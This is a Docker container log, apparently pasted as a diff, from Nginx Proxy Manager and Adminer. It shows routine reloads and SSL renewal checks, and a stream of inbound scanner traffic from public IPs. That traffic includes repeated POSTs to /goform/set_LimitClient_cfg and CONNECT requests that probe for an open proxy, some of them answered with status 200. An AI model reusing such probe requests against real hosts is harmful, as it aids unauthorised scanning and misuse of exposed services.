+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:29:57 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:31:50 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [11:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/9/2024] [11:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/9/2024] [11:03:53 PM] [IP Ranges] › ℹ  info      Fetching IP Ranges from online services...
+[32mnginx_proxy_manager |[0m [7/9/2024] [11:03:53 PM] [IP Ranges] › ℹ  info      Fetching https://ip-ranges.amazonaws.com/ip-ranges.json
+[32mnginx_proxy_manager |[0m [7/9/2024] [11:03:54 PM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v4
+[32mnginx_proxy_manager |[0m [7/9/2024] [11:03:54 PM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v6
+[32mnginx_proxy_manager |[0m [7/9/2024] [11:03:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [11:03:54 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [11:03:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/10/2024] [12:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [12:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [1:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [1:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [2:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [2:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [3:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [3:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:56:02 AM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:56:02 AM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:56:02 AM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:56:02 AM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:56:02 AM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:56:03 AM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:56:03 AM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[36madminer      |[0m [Wed Jul 10 05:36:22 2024] [::ffff:87.121.69.27]:39540 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 05:36:22 2024] [::ffff:87.121.69.27]:39540 Closing
+[36madminer      |[0m [Wed Jul 10 05:41:44 2024] [::ffff:5.45.98.127]:46702 Accepted
+[36madminer      |[0m [Wed Jul 10 05:41:44 2024] [::ffff:5.45.98.127]:46702 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 05:41:44 2024] [::ffff:5.45.98.127]:46702 Closing
+[36madminer      |[0m [Wed Jul 10 06:19:29 2024] [::ffff:94.156.10.163]:52720 Accepted
+[36madminer      |[0m [Wed Jul 10 06:19:29 2024] [::ffff:94.156.10.163]:52720 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 06:19:29 2024] [::ffff:94.156.10.163]:52720 Closing
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42004 Accepted
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42004 [200]: GET http://example.com/
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42004 Closing
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42010 Accepted
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42010 [200]: CONNECT example.com:443
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42010 Closing
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42026 Accepted
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42026 [200]: GET http://example.com/
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42026 Closing
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42028 Accepted
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42028 [200]: CONNECT example.com:443
+[36madminer      |[0m [Wed Jul 10 06:45:31 2024] [::ffff:185.224.128.63]:42028 Closing
+[36madminer      |[0m [Wed Jul 10 07:10:50 2024] [::ffff:154.212.141.144]:41620 Accepted
+[36madminer      |[0m [Wed Jul 10 07:10:50 2024] [::ffff:154.212.141.144]:41620 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 07:10:50 2024] [::ffff:154.212.141.144]:41620 Closing
+[36madminer      |[0m [Wed Jul 10 07:10:51 2024] [::ffff:103.149.26.240]:11548 Accepted
+[36madminer      |[0m [Wed Jul 10 07:10:51 2024] [::ffff:103.149.26.240]:11548 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 07:10:51 2024] [::ffff:103.149.26.240]:11548 Closing
+[36madminer      |[0m [Wed Jul 10 07:10:52 2024] [::ffff:103.149.26.240]:11572 Accepted
+[36madminer      |[0m [Wed Jul 10 07:10:52 2024] [::ffff:103.149.26.240]:11572 [200]: GET /?file=favicon.ico&amp;version=4.8.1
+[36madminer      |[0m [Wed Jul 10 07:10:52 2024] [::ffff:103.149.26.240]:11572 Closing
+[36madminer      |[0m [Wed Jul 10 07:20:52 2024] [::ffff:94.156.10.164]:49458 Accepted
+[36madminer      |[0m [Wed Jul 10 07:20:52 2024] [::ffff:94.156.10.164]:49458 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 07:20:52 2024] [::ffff:94.156.10.164]:49458 Closing
+[36madminer      |[0m [Wed Jul 10 07:59:33 2024] [::ffff:1.172.95.86]:62684 Accepted
+[36madminer      |[0m [Wed Jul 10 07:59:33 2024] [::ffff:1.172.95.86]:62684 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 07:59:33 2024] [::ffff:1.172.95.86]:62684 Closing
+[36madminer      |[0m [Wed Jul 10 07:59:33 2024] [::ffff:1.172.95.86]:62686 Accepted
+[36madminer      |[0m [Wed Jul 10 07:59:33 2024] [::ffff:1.172.95.86]:62686 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 07:59:33 2024] [::ffff:1.172.95.86]:62686 Closing
+[36madminer      |[0m [Wed Jul 10 08:22:48 2024] [::ffff:141.98.11.15]:56120 Accepted
+[36madminer      |[0m [Wed Jul 10 08:22:48 2024] [::ffff:141.98.11.15]:56120 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 08:22:48 2024] [::ffff:141.98.11.15]:56120 Closing
+[36madminer      |[0m [Wed Jul 10 09:20:47 2024] [::ffff:184.105.139.95]:10779 Accepted
+[36madminer      |[0m [Wed Jul 10 09:20:47 2024] [::ffff:184.105.139.95]:10779 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 09:20:47 2024] [::ffff:184.105.139.95]:10779 Closing
+[36madminer      |[0m [Wed Jul 10 09:21:22 2024] [::ffff:184.105.139.103]:48515 Accepted
+[36madminer      |[0m [Wed Jul 10 09:21:22 2024] [::ffff:184.105.139.103]:48515 [404]: GET /favicon.ico - No such file or directory
+[36madminer      |[0m [Wed Jul 10 09:21:22 2024] [::ffff:184.105.139.103]:48515 Closing
+[36madminer      |[0m [Wed Jul 10 09:21:58 2024] [::ffff:184.105.139.71]:41657 Accepted
+[36madminer      |[0m [Wed Jul 10 09:21:58 2024] [::ffff:184.105.139.71]:41657 [200]: GET http://api.ipify.org/?format=json
+[36madminer      |[0m [Wed Jul 10 09:21:58 2024] [::ffff:184.105.139.71]:41657 Closing
+[36madminer      |[0m [Wed Jul 10 09:22:23 2024] [::ffff:184.105.139.119]:41231 Accepted
+[36madminer      |[0m [Wed Jul 10 09:22:24 2024] [::ffff:184.105.139.119]:41231 [200]: CONNECT www.shadowserver.org:443
+[36madminer      |[0m [Wed Jul 10 09:22:24 2024] [::ffff:184.105.139.119]:41231 Closing
+[36madminer      |[0m [Wed Jul 10 09:35:54 2024] [::ffff:198.235.24.196]:58812 Accepted
+[36madminer      |[0m [Wed Jul 10 09:35:54 2024] [::ffff:198.235.24.196]:58812 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 09:35:54 2024] [::ffff:198.235.24.196]:58812 Closing
+[36madminer      |[0m [Wed Jul 10 09:51:57 2024] [::ffff:179.60.147.13]:64570 Accepted
+[36madminer      |[0m [Wed Jul 10 09:51:57 2024] [::ffff:179.60.147.13]:64570 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 09:51:57 2024] [::ffff:179.60.147.13]:64570 Closing
+[36madminer      |[0m [Wed Jul 10 10:08:53 2024] [::ffff:80.76.49.133]:34370 Accepted
+[36madminer      |[0m [Wed Jul 10 10:08:53 2024] [::ffff:80.76.49.133]:34370 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 10:08:53 2024] [::ffff:80.76.49.133]:34370 Closing
+[36madminer      |[0m [Wed Jul 10 10:26:31 2024] [::ffff:38.222.52.184]:43109 Accepted
+[36madminer      |[0m [Wed Jul 10 10:26:31 2024] [::ffff:38.222.52.184]:43109 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 10:26:31 2024] [::ffff:38.222.52.184]:43109 Closing
+[36madminer      |[0m [Wed Jul 10 10:26:31 2024] [::ffff:38.222.52.184]:43111 Accepted
+[36madminer      |[0m [Wed Jul 10 10:26:31 2024] [::ffff:38.222.52.184]:43111 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 10:26:31 2024] [::ffff:38.222.52.184]:43111 Closing
+[36madminer      |[0m [Wed Jul 10 10:28:33 2024] [::ffff:94.156.10.163]:60712 Accepted
+[36madminer      |[0m [Wed Jul 10 10:28:33 2024] [::ffff:94.156.10.163]:60712 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 10:28:33 2024] [::ffff:94.156.10.163]:60712 Closing
+[36madminer      |[0m [Wed Jul 10 11:03:16 2024] [::ffff:172.18.0.1]:57036 Accepted
+[36madminer      |[0m [Wed Jul 10 11:03:16 2024] [::ffff:172.18.0.1]:57036 [200]: HEAD /
+[36madminer      |[0m [Wed Jul 10 11:03:16 2024] [::ffff:172.18.0.1]:57036 Closing
+[36madminer      |[0m [Wed Jul 10 11:05:31 2024] [::ffff:94.156.10.163]:48688 Accepted
+[36madminer      |[0m [Wed Jul 10 11:05:31 2024] [::ffff:94.156.10.163]:48688 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 11:05:31 2024] [::ffff:94.156.10.163]:48688 Closing
+[36madminer      |[0m [Wed Jul 10 11:13:12 2024] [::ffff:185.191.126.213]:45520 Accepted
+[36madminer      |[0m [Wed Jul 10 11:13:12 2024] [::ffff:185.191.126.213]:45520 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 11:13:12 2024] [::ffff:185.191.126.213]:45520 Closing
+[36madminer      |[0m [Wed Jul 10 11:28:09 2024] [::ffff:179.60.147.13]:64096 Accepted
+[36madminer      |[0m [Wed Jul 10 11:28:09 2024] [::ffff:179.60.147.13]:64096 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 11:28:09 2024] [::ffff:179.60.147.13]:64096 Closing
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56586 Accepted
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56586 [200]: CONNECT example.com:443
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56586 Closing
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56600 Accepted
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56600 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56600 Closing
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56614 Accepted
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56614 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56614 Closing
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56626 Accepted
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:53 AM] [IP Ranges] › ℹ  info      Fetching IP Ranges from online services...
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:53 AM] [IP Ranges] › ℹ  info      Fetching https://ip-ranges.amazonaws.com/ip-ranges.json
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:54 AM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v4
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:54 AM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v6
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:54 AM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:54 AM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:54 AM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/10/2024] [6:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [6:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [7:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [7:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [8:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [8:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [9:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [9:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [10:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [10:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [11:03:53 AM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [11:03:53 AM] [IP Ranges] › ℹ  info      Fetching IP Ranges from online services...
+[32mnginx_proxy_manager |[0m [7/10/2024] [11:03:53 AM] [IP Ranges] › ℹ  info      Fetching https://ip-ranges.amazonaws.com/ip-ranges.json
+[32mnginx_proxy_manager |[0m [7/10/2024] [11:03:53 AM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [11:03:54 AM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v4
+[32mnginx_proxy_manager |[0m [7/10/2024] [11:03:54 AM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v6
+[32mnginx_proxy_manager |[0m [7/10/2024] [11:03:54 AM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/10/2024] [11:03:54 AM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/10/2024] [11:03:54 AM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/10/2024] [12:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [12:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [1:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [1:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [2:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [2:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [3:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [3:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [4:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:53 PM] [IP Ranges] › ℹ  info      Fetching IP Ranges from online services...
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:53 PM] [IP Ranges] › ℹ  info      Fetching https://ip-ranges.amazonaws.com/ip-ranges.json
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:53 PM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v4
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:54 PM] [IP Ranges] › ℹ  info      Fetching https://www.cloudflare.com/ips-v6
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:54 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/10/2024] [5:03:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/10/2024] [6:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [6:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [7:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [7:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [8:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [8:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [9:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [9:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/10/2024] [10:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/10/2024] [10:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56626 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 11:49:41 2024] [::ffff:45.128.232.152]:56626 Closing
+[36madminer      |[0m [Wed Jul 10 12:20:24 2024] [::ffff:94.156.10.164]:33310 Accepted
+[36madminer      |[0m [Wed Jul 10 12:20:24 2024] [::ffff:94.156.10.164]:33310 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 12:20:24 2024] [::ffff:94.156.10.164]:33310 Closing
+[36madminer      |[0m [Wed Jul 10 12:21:02 2024] [::ffff:45.164.23.123]:33984 Accepted
+[36madminer      |[0m [Wed Jul 10 12:21:02 2024] [::ffff:45.164.23.123]:33984 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 12:21:02 2024] [::ffff:45.164.23.123]:33984 Closing
+[36madminer      |[0m [Wed Jul 10 12:21:02 2024] [::ffff:45.164.23.123]:34002 Accepted
+[36madminer      |[0m [Wed Jul 10 12:21:02 2024] [::ffff:45.164.23.123]:34002 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 12:21:02 2024] [::ffff:45.164.23.123]:34002 Closing
+[36madminer      |[0m [Wed Jul 10 12:53:14 2024] [::ffff:80.91.157.110]:56611 Accepted
+[36madminer      |[0m [Wed Jul 10 12:53:14 2024] [::ffff:80.91.157.110]:56611 [200]: GET /
